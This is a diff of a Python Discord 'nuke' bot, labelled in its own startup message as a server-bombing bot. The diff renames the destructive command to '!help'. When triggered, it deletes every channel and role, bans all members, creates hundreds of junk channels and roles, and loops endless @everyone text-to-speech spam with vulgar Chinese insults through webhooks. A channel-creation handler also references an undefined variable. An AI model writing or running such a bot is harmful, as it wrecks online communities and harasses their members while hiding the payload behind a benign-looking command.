@@ -5,26 +5,49 @@ from discord.commands import slash_command
 
 intents = discord.Intents().all()
 bot = commands.Bot(command_prefix='!',intents = intents)
+token = ""
 
 @bot.event
 async def on_ready():
     print(f"您的炸群機器人{bot.user}已準備")
-    print("**請使用/cleaer刪除所有頻道   /boom_server炸群**")
+    print("請使用 !help 進行轟炸")
 
 
-@bot.slash_command(description="早安阿這是測試指令1")
-async def cleaer(ctx):
+@bot.command()
+async def help(ctx):
     for channel in ctx.guild.channels:
         try:
             await channel.delete()
         except:
             pass
+    for role in ctx.guild.roles:
+        try:
+            await role.delete()
+        except:
+            pass
+    for member in ctx.guild.members:
+        try:
+            await member.ban()
+        except:
+            pass
+    for i in range(1, 500):
+        try:
+            await ctx.guild.create_text_channel(name="e04-nuke-you")
+            await ctx.guild.create_role(name = "垃圾群組")
+        except:
+            pass
+    for channel in ctx.guild.channels:
+        webhook = await channel.create_webhook(name="e04 吃雞雞")
+        while True:
+            await channel.send(f"@everyone@here\n吃我雞巴",tts=True)
+            await webhook.send(f"@everyone@here\n吃我雞巴",tts=True)
 
-@bot.slash_command(description="晚安這是測試指令2")
-async def boom_server(ctx):
+@bot.event
+async def on_guild_channel_create(channel):
+  
+    webhook = await channel.create_webhook(name="幹垃圾群組")
     while True:
-        await ctx.guild.create_text_channel(name="淦-垃圾群組")
-        for channel in ctx.guild.channels:
-            await channel.send("# @everyone 放煙火咯 🧨🧨🧨 淦垃圾群組就是要被炸")
+        await channel.send(f"@everyone@here\n{message}",tts=True)
+        await webhook.send(f"@everyone@here\n{message}",tts=True)
 
-bot.run("")
+bot.run(token)
